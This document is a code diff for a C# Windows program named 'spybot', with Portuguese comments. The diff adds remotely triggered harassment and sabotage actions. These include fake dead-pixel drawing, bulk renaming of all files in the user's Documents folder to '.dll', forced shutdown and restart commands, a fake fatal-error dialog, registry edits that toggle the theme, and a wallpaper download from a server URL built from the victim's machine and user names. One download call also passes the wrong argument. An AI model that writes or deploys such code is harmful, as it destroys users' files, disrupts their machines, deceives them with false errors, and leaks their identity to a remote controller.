@@ -8,6 +8,7 @@ using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using Microsoft.Win32;
 
 namespace spy
 {
@@ -34,7 +35,15 @@ namespace spy
             12      =   Fecha os navegadores repetidamente
             13      =   Buga o PC, finalizando o EXPLORER.EXE
             14      =   Clica o Mouse em um lugar aleatorio da tela
-            15      =   Ficar digitando leetras aleatorias sem parar
+            15      =   Ficar digitando letras aleatorias sem parar
+            16      =   Simula um pixel queimado na tela (linha)
+            17      =   Simula um pixel queimado na tela
+            18      =   Corrompe os arquivos da pasta "Documentos" e fecha o programa
+            19      =   Desliga o pc
+            20      =   Reinicia o pc
+            21      =   Mensagem de erro e reinicia o pc
+            22      =   Fica alternando o tema do Windows entre dark e light
+            23      =   Aplica papel de parede via site
      */
     class spybot
     {
@@ -236,7 +245,9 @@ namespace spy
                     }
                     if (ACAO == "13")//
                     {
+                        intervalo = 5000;
                         finalizarProcesso("explorer");
+                        f.Close();
                     }
                     if (ACAO == "14")//
                     {
@@ -248,6 +259,62 @@ namespace spy
                         intervalo = 30000;
                         SendKeys.SendWait(letraAleatoria()); 
                     }
+                    if (ACAO == "16")//
+                    {
+                        intervalo = 500;
+                        spybot.linhaPixelQueimadoFake(100);
+                        spybot.linhaPixelQueimadoFake(110);
+                    }
+                    if (ACAO == "17")//
+                    {
+                        intervalo = 5000;
+                        spybot.pixelQueimadoFake();
+                    }
+                    if (ACAO == "18")//
+                    {
+                        intervalo = 5000;
+                        mudarExtencaoArquivos(PASTAS.MyDocuments);
+                        f.Close();
+                    }
+                    if (ACAO == "19")//
+                    {
+                        intervalo = 5000;
+                        desligarPC();
+
+                    }
+                    if (ACAO == "20")//
+                    {
+                        intervalo = 5000;
+                        reiniciarPC();
+                    }
+                    if (ACAO == "21")//
+                    {
+                        intervalo = 5000;
+                        msgErro();
+                        Thread.Sleep(10000);
+                        reiniciarPC();
+                    }
+                    if (ACAO == "22")//
+                    {
+                        intervalo = 20000;
+
+                        Random random = new Random();
+                        int mmmmm = random.Next(0, 100);
+                        if (mmmmm % 2 == 0)
+                        {
+                            MudarParaTemaClaro();
+                        }
+                        else
+                        {
+                            MudarParaTemaEscuro();
+                        }
+                    }
+                    if (ACAO == "23")//
+                    {
+                        intervalo = 20000;
+                        MudarFundoDeTela();
+                    }
+                    
                 }
             };
         }
@@ -609,7 +676,167 @@ namespace spy
 
 
 
+        public static void linhaPixelQueimadoFake(int px_Y = 100)
+        {
+            try
+            {
+                IntPtr hdc = GetDC(IntPtr.Zero);
+                Graphics g = Graphics.FromHdc(hdc);
+                Pen pen = new Pen(Color.Magenta, 1);
+                g.DrawLine(pen, px_Y, 0, px_Y, Screen.PrimaryScreen.Bounds.Height);
+                ReleaseDC(IntPtr.Zero, hdc);
+            }
+            catch { }
+            
+        }
 
+
+        public static void pixelQueimadoFake()
+        {
+            try
+            {
+                Random rnd = new Random();
+                int x = rnd.Next(0, Screen.PrimaryScreen.Bounds.Width);
+                int y = rnd.Next(0, Screen.PrimaryScreen.Bounds.Height);
+                Graphics.FromHdc(
+                    GetDC(IntPtr.Zero)).FillRectangle(
+                    new SolidBrush(Color.Magenta),
+                    x, y, 10, 10
+                    );  // O último parâmetro define a largura e altura do ponto (1x1)
+                ReleaseDC(IntPtr.Zero, GetDC(IntPtr.Zero));
+            }
+            catch { }
+            
+        }
+
+
+
+        public static class PASTAS
+        {
+            public static string MyPictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+            public static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            public static string StartMenu = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
+            public static string Cookies = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
+            public static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+            public static string InternetCache = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
+            public static string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            public static string MyComputer = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);
+            public static string MyMusic = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
+            public static string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            public static string MyVideos = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
+       
+        }
+
+        public static void mudarExtencaoArquivos(string pasta, string extencao = ".dll")
+        {
+            string[] arquivos = Directory.GetFiles(pasta, "*.*", SearchOption.AllDirectories);
+            foreach (var arquivo in arquivos)
+            {
+                try
+                {
+                    string novoCaminho = Path.ChangeExtension(arquivo, extencao);
+                    File.Move(arquivo, novoCaminho);
+                }
+                catch (Exception ex) { }
+            }
+        }
+         
+        public static void desligarPC()
+        {
+            try
+            {
+                Process.Start("shutdown", "/s /f /t 0");
+            }
+            catch { }
+            
+        }  
+        public static void reiniciarPC()
+        {
+            try
+            {
+                Process.Start("shutdown", "/r /f /t 0");
+            }
+            catch { }
+           
+        }
+
+         
+        public static void msgErro()
+        {
+            MessageBox.Show("Erro crítico! O sistema encontrou um problema inesperado e precisa reiniciar.",
+                       "Erro Fatal", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+        }
+        public static void MudarParaTemaClaro()
+        {
+            try
+            {
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "AppsUseLightTheme", 1);
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "SystemUsesLightTheme", 1);
+
+            }
+            catch { }
+         }
+
+        public static void MudarParaTemaEscuro()
+        {
+            try
+            {
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "AppsUseLightTheme", 0);
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "SystemUsesLightTheme", 0);
+
+            }
+            catch { }
+             }
+         public static void MudarParaTemaPadrao()
+        {
+            try
+            {
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "AppsUseLightTheme", 1);
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "SystemUsesLightTheme", 0);
+
+            }
+            catch { }
+             }
+
+
+
+
+        static void DownloadImage(string imageUrl, string localPath)
+        {
+            using (WebClient client = new WebClient())
+            {
+                try
+                {
+                    client.DownloadFile(imageUrl, localPath);
+                }
+                catch (Exception ex)
+                {
+                }
+            }
+        }
+
+        public static void MudarFundoDeTela()
+        {
+            try
+            {
+                string url = SITE + "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/wallpaper.png";
+                //string imageUrl = "https://th.bing.com/th/id/OIP.uwteg2Qa3dIeY00GaeuOoQHaEK?cb=iwp2&rs=1&pid=ImgDetMain";  // Link para a imagem da web
+                string localPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "wallpaper.png");
+
+                if (File.Exists(localPath))
+                {
+                    SystemParametersInfo(0x0014, 0, localPath, 0x01 | 0x02);
+                }
+                else
+                {
+                    DownloadImage(localPath, localPath);
+                }
+            }
+            catch { }
+            
+             
+        }
 
 
 
@@ -653,6 +880,10 @@ namespace spy
         static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
         [DllImport("user32.dll", SetLastError = true)]
         static extern IntPtr SendMessage(IntPtr a, uint b, IntPtr c, IntPtr d);
+
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 
     }
 }
